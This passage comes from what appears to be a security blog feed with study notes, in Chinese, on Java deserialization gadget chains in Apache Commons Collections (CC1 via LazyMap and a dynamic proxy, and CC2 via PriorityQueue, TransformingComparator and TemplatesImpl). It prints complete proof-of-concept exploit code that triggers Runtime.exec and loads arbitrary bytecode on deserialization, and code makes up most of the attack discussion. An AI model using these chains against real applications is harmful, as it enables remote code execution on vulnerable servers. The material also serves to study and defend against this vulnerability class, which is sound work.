class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>LazyMap</code>与<code>TransformedMap</code>相类似，是一个protected属性的类，无法直接构造，因此我们需要去调用其<code>decorate</code>去构造一个<code>LazyMap</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Ee9GJ">动态代理 调用get方法</h3>
调用get方法的地方很多，我们这里直接找到我们需要的`AnnotationInvocationHandler`中的`invoke`方法，其中`Object result = memberValues.get(member);`部分调用了 `get`方法，且member参数可控

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>构造好LazyMap后，想要通过<code>AnnotationInvocationHandler</code>触发<code>get</code>方法，我们需要构造一个动态代理，因为想要调用invoke方法，需要用动态代理去调用任意一个方法，从而调用<code>invoke</code>方法里面的<code>get</code>方法</p>
<blockquote>
<p>Proxy类继承了Serializable接口</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);</span><br></pre></td></tr></table></figure>

<p>构造好动态代理后，需要去调用其任意方法</p>
<p>下面是invoke方法部分代码</p>
<p>代码表达的意思是想要走到get方法，就不能调用其equals方法，且调用的是一个无参方法才行，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>有一个特别巧妙地地方，在<code>AnnotationInvocationHandler</code>的<code>readObject</code>中，会有一个调用memberValues的<code>entrySet</code>方法，正好是一个不为equals的无参方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet())</span><br></pre></td></tr></table></figure>

<p>根据分析写出的整个poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="VfTKc">版本修复</h2>

<p>实际在jdk_8u71之后，<code>AnnotationInvocationHandler</code>类做了一些调整，直接去掉了<code>readObject</code>中的<code>checkSetValue</code>方法</p>
<p>而对动态代理类的序列化也有一定的调整，但是实际非常麻烦，这里我们就不说了</p>
<p>因此这两条链都断了</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC2链</title>
    <url>/2025/02/28/CC2%E9%93%BE/</url>
    <content><![CDATA[<h1 id="HHDQS">CC2链</h1>
<h2 id="UMv6S">CC2攻击链分析</h2>


<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734799667661-9d10de39-d60d-4e91-9b7a-6c7043603e66.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734799667661-9d10de39-d60d-4e91-9b7a-6c7043603e66.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="TRYXk">add流程解析</h3>
之前这里没有搞明白，这次这里动态调试了一下，发现应该是差不多了，回来补一下

<p>在这里add之后进行了下列操作，就是将add的元素，放入了queue数组中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> offer(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">            grow(i + <span class="number">1</span>);</span><br><span class="line">        size = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            queue[<span class="number">0</span>] = e;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUp(i, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里的grow方法其实无关紧要，if判断中的<font style="color:#080808;background-color:#ffffff;">queue.length在默认情况下是11，grow方法的作用就是</font><code>// Double size if small; else grow by 50%</code><font style="color:#080808;background-color:#ffffff;">，就是如果i大于等于这个长度时，就会扩大这个队列的长度</font></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">grow</span><span class="params">(<span class="type">int</span> minCapacity)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> queue.length;</span><br><span class="line">        <span class="comment">// Double size if small; else grow by 50%</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity + ((oldCapacity &lt; <span class="number">64</span>) ?</span><br><span class="line">                                         (oldCapacity + <span class="number">2</span>) :</span><br><span class="line">                                         (oldCapacity &gt;&gt; <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// overflow-conscious code</span></span><br><span class="line">        <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">            newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">        queue = Arrays.copyOf(queue, newCapacity);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面<code>siftUp</code>方法的代码如下，当队列不为空时，会根据comparator的情况调用不同的方法，但是两者大致的情况就是，将传入的参数和队列中数据进行比较，然后进行排序（大概是这样）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftUpUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUpComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpComparable</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        Comparable&lt;? <span class="built_in">super</span> E&gt; key = (Comparable&lt;? <span class="built_in">super</span> E&gt;) x;</span><br><span class="line">        <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">            <span class="keyword">if</span> (key.compareTo((E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = e;</span><br><span class="line">            k = parent;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = key;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="vUdaI">反序列化流程分析</h3>

<p>这里大家可以看到heapify，它调用了siftDown(i, (E) queue[i])，我们传入两个参数，所以size为2，二进制右移一位后就为0，所以这里只能遍历到<code>queue[0]</code></p>
<p>接下来调用的siftDown中的x就是templates</p>
<p>最后在siftDownUsingComparator中的<code>if (comparator.compare(x, (E) c) &lt;= 0)</code>，第一次遍历时相当于调用了<code>TransformingComparator.compare(queue[0],queue[1])</code>,也就调用了<code>invoketransform.transform(templates)</code>，调用了templates的newTransformer方法，这里就和前面接上了</p>
<blockquote>
<p>这里的k&lt;half，有点二分查找的感觉了</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">heapify();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)<span class="comment">//最后就是在这里执行代码</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="loAfh">代码替换</h3>

<p>下面是cc2链与cc4链存在差异的代码，可以看出，cc2相比于cc4，少了<code>ChainedTransformer</code>这个类的使用</p>
<p>且cc2存在着cc1的老问题，已经不想多说了，还是构造时传入无用的东西，反射修改回来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC4</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//CC2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TransformingComparator</span>&gt; aClass = transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="VDJ24">最终代码</h2>
进行比较是，我们的templates应第一个add进去

<p>因为在对第一个对象进行transform方法调用时，我们传入的<code>Integer</code>类型，无 <code>newTransformer</code>方法，报错导致后面的<code>templates.transform</code>无法执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span>templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740708431644-08851d02-327c-414c-b3bc-f8f839076b57.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740708431644-08851d02-327c-414c-b3bc-f8f839076b57.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="X8o7s">自己的思考</h2>
之前说（下面），我在想，若传入一个存在`newTransformer`方法的类，是否也可以使恶意代码执行

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740704975146-97e0c299-9e90-4b71-931b-478868a85715.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740704975146-97e0c299-9e90-4b71-931b-478868a85715.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>找的过程很艰难，存在该方法的没有继承<code>Serializable</code>接口，且在add方法时，就会触发<code>newTransformer</code>方法，报错导致后续代码无法执行，因此尝试反射修改,但是这里失败了，因为queue有transient修饰，不带入序列化数据中</p>
<p>就这样结束了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> Object[] queue;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
